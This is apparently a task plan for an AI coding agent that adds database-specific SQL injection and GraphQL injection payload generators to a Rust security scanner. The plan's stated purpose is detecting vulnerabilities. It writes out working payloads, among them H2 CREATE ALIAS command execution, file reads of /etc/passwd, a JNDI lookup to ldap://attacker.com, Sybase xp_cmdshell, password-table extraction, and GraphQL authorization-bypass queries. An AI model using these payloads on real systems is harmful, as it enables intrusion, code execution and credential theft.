---
phase: 01-payload-foundation
plan: 02
type: execute
wave: 2
depends_on: ["01-01"]
files_modified:
  - src/payloads_comprehensive.rs
autonomous: true

must_haves:
  truths:
    - "Payload database includes H2-specific SQLi payloads (CREATE ALIAS, CSVREAD, LINK_SCHEMA)"
    - "Payload database includes MariaDB-specific SQLi payloads (version detection, CONNECT engine)"
    - "Payload database includes CockroachDB-specific SQLi payloads (crdb_internal tables)"
    - "Payload database includes Sybase-specific SQLi payloads (master..sysdatabases, WAITFOR)"
    - "Payload database includes GraphQL injection payloads (introspection, batching, nested queries)"
  artifacts:
    - path: "src/payloads_comprehensive.rs"
      provides: "Database-specific and GraphQL injection payload generators"
      contains: "generate_h2_specific_sqli"
      min_lines: 2500
  key_links:
    - from: "src/payloads_comprehensive.rs"
      to: "get_all_sqli_payloads()"
      via: "aggregator function call"
      pattern: "generate_h2_specific_sqli\\(\\)"
    - from: "src/payloads_comprehensive.rs"
      to: "get_all_advanced_payloads()"
      via: "aggregator function call"
      pattern: "generate_graphql_injection_payloads\\(\\)"
---

<objective>
Add database-specific SQLi payloads for H2, MariaDB, CockroachDB, and Sybase, plus GraphQL injection payloads.

Purpose: Enable detection of SQL injection in less common databases and GraphQL APIs that are increasingly used in modern applications.

Output: Extended payloads_comprehensive.rs with 4 new SQLi generators, 1 GraphQL generator, and updated aggregators.
</objective>

<execution_context>
@C:\Users\whips\.claude/get-shit-done/workflows/execute-plan.md
@C:\Users\whips\.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/01-payload-foundation/01-RESEARCH.md
@.planning/phases/01-payload-foundation/01-01-SUMMARY.md
@src/payloads_comprehensive.rs
</context>

<tasks>

<task type="auto">
  <name>Task 1: Add H2 and MariaDB specific SQLi payloads</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
Create two new functions for H2 and MariaDB SQLi payloads. Place them after `generate_oracle_specific_sqli()`.

**Function 1: `generate_h2_specific_sqli() -> Vec<String>`**

Include these H2-specific vectors (from research):

1. Version detection:
   - `' UNION SELECT H2VERSION()--`
   - `' UNION SELECT NULL,H2VERSION()--`

2. CREATE ALIAS RCE (critical H2-specific):
   - `'; CREATE ALIAS EXEC AS $$ void e(String cmd) throws java.io.IOException {java.lang.Runtime.getRuntime().exec(cmd);}$$--`
   - `'; CALL EXEC('whoami')--`

3. File read via CSVREAD:
   - `' UNION SELECT * FROM CSVREAD('/etc/passwd')--`
   - `' UNION SELECT * FROM CSVREAD('C:/windows/win.ini')--`

4. LINK_SCHEMA JNDI injection (CVE-2021-42392):
   - `'; SELECT * FROM LINK_SCHEMA('pwnfr0g', 'javax.naming.InitialContext', 'ldap://attacker.com:1389/Exploit', ...)--`

5. Error-based and time-based:
   - `' AND 1=CAST(H2VERSION() AS INT)--`

Generate 15+ H2-specific payloads.

**Function 2: `generate_mariadb_specific_sqli() -> Vec<String>`**

Include these MariaDB-specific vectors:

1. Version detection (distinguishes from MySQL):
   - `' UNION SELECT @@version--` (shows "10.x.x-MariaDB")
   - `' AND (SELECT @@version) LIKE '%MariaDB%'--`

2. MariaDB-specific functions:
   - `' UNION SELECT UUID_SHORT()--`
   - `' UNION SELECT JSON_QUERY('{}', '$')--` (MariaDB 10.2.3+)
   - `' UNION SELECT COLUMN_JSON(COLUMN_CREATE('a', 1))--` (dynamic columns)

3. CONNECT storage engine file read:
   - `'; CREATE TABLE t1 ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'--`

4. Version-conditional execution (`/*!NNNNN */`):
   - `' /*!100300 UNION SELECT password FROM users*/--` (10.3.0+)
   - `' /*!50000 UNION*/ SELECT 1,2,3--`

5. System tables and time-based:
   - `' UNION SELECT user FROM mysql.user--`
   - `' AND SLEEP(5)--`

Generate 20+ MariaDB-specific payloads.
  </action>
  <verify>
Run `cargo check` to verify syntax. Grep for function names to confirm both exist.
  </verify>
  <done>
Functions `generate_h2_specific_sqli()` (15+ payloads) and `generate_mariadb_specific_sqli()` (20+ payloads) exist with H2-specific vectors (CREATE ALIAS, CSVREAD, LINK_SCHEMA) and MariaDB-specific vectors (version detection, CONNECT engine, conditional comments).
  </done>
</task>

<task type="auto">
  <name>Task 2: Add CockroachDB and Sybase specific SQLi payloads</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
Create two new functions for CockroachDB and Sybase. Place after MariaDB function.

**Function 1: `generate_cockroachdb_specific_sqli() -> Vec<String>`**

CockroachDB uses PostgreSQL wire protocol but has unique features:

1. Version detection:
   - `' UNION SELECT version()--` (shows "CockroachDB CCL vXX.X.X")
   - `' UNION SELECT crdb_internal.node_id()--`
   - `' AND version() LIKE '%CockroachDB%'--`

2. CockroachDB internal tables (unique to CRDB):
   - `' UNION SELECT * FROM crdb_internal.tables--`
   - `' UNION SELECT * FROM crdb_internal.zones--`
   - `' UNION SELECT * FROM crdb_internal.cluster_settings--`
   - `' UNION SELECT * FROM crdb_internal.node_statement_statistics--`

3. CockroachDB specific functions:
   - `' UNION SELECT crdb_internal.cluster_id()--`
   - `' UNION SELECT gen_random_uuid()--`

4. PostgreSQL-compatible payloads:
   - `' UNION SELECT current_database()--`
   - `' AND pg_sleep(5)--`

5. EXPLAIN for info disclosure:
   - `'; EXPLAIN SELECT * FROM users--`

Generate 15+ CockroachDB-specific payloads.

**Function 2: `generate_sybase_specific_sqli() -> Vec<String>`**

Sybase ASE is similar to MSSQL but with differences:

1. Version detection:
   - `' AND 1=convert(numeric,(SELECT @@version))--`
   - `' UNION SELECT @@version--`

2. Sybase system tables (case-sensitive):
   - `' UNION SELECT name FROM master..sysdatabases--`
   - `' UNION SELECT name FROM sysobjects WHERE type='U'--`
   - `' UNION SELECT name FROM syscolumns--`
   - `' UNION SELECT suser_name()--`

3. Stacking and xp_cmdshell:
   - `'; SELECT @@servername--`
   - `'; EXEC xp_cmdshell 'whoami'--`

4. Time-based blind:
   - `'; WAITFOR DELAY '0:0:5'--`

5. Error-based (integer conversion):
   - `' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects))--`

6. Login extraction:
   - `' UNION SELECT name,password FROM master..syslogins--`

Generate 20+ Sybase-specific payloads.
  </action>
  <verify>
Run `cargo check`. Grep for function names to confirm both exist.
  </verify>
  <done>
Functions `generate_cockroachdb_specific_sqli()` (15+ payloads with crdb_internal tables) and `generate_sybase_specific_sqli()` (20+ payloads with master..sysdatabases, WAITFOR) exist.
  </done>
</task>

<task type="auto">
  <name>Task 3: Add GraphQL injection payloads and wire all to aggregators</name>
  <files>src/payloads_comprehensive.rs</files>
  <action>
**Part A: Create GraphQL injection function**

Create `generate_graphql_injection_payloads() -> Vec<String>` near the end of the file (before `get_all_advanced_payloads()`):

1. Introspection queries (schema discovery):
   - Full schema introspection query
   - Simplified: `{"query":"{__schema{types{name,fields{name}}}}"}`
   - Query type discovery: `{"query":"{__type(name:\"Query\"){name,fields{name,args{name,type{name}}}}}"`

2. Batching attacks (rate limit bypass):
   - JSON array batching with multiple login mutations
   - Alias-based batching: `{"query":"mutation{a:login(...){token}b:login(...){token}}"}`

3. Deeply nested queries (DoS/complexity):
   - `{"query":"{user{friends{friends{friends{friends{id}}}}}}"}`

4. SQL injection through GraphQL arguments:
   - `{"query":"{user(id:\"1' OR '1'='1\"){id,email}}"}`
   - `{"query":"{user(id:\"1 UNION SELECT NULL,password FROM users--\"){id}}"}`

5. NoSQL injection through GraphQL:
   - `{"query":"{user(filter:\"{\\\"$ne\\\":null}\"){id}}"}`

6. Field/directive overloading:
   - `{"query":"{user{id id id id name name name name}}"}`

7. Authorization bypass attempts:
   - `{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}`
   - `{"query":"{user(id:1){password,secretKey}}"}`

Generate 25+ GraphQL payloads.

**Part B: Update aggregators**

Update `get_all_sqli_payloads()`:
```rust
all_payloads.extend(generate_h2_specific_sqli());        // NEW
all_payloads.extend(generate_mariadb_specific_sqli());   // NEW
all_payloads.extend(generate_cockroachdb_specific_sqli()); // NEW
all_payloads.extend(generate_sybase_specific_sqli());    // NEW
```

Update `get_all_advanced_payloads()`:
```rust
all_payloads.extend(generate_graphql_injection_payloads()); // NEW
```

Add comment annotations for payload counts.
  </action>
  <verify>
Run `cargo build --release` to verify full compilation. Test that all new functions are called in aggregators.
  </verify>
  <done>
`cargo build --release` succeeds. GraphQL payloads (25+) and all 4 database-specific generators are wired into their respective aggregators.
  </done>
</task>

</tasks>

<verification>
1. `cargo build --release` completes successfully
2. `cargo test` passes (if payload tests exist)
3. Grep confirms all 5 new generator functions exist and are called in aggregators:
   - generate_h2_specific_sqli
   - generate_mariadb_specific_sqli
   - generate_cockroachdb_specific_sqli
   - generate_sybase_specific_sqli
   - generate_graphql_injection_payloads
</verification>

<success_criteria>
- PAY-03 satisfied: H2, MariaDB, CockroachDB, Sybase payloads with database-specific vectors
- PAY-04 satisfied: GraphQL payloads with introspection, batching, nested queries, SQLi through args
- Code compiles and integrates with existing payload system
- Phase 1 requirements complete
</success_criteria>

<output>
After completion, create `.planning/phases/01-payload-foundation/01-02-SUMMARY.md`
</output>
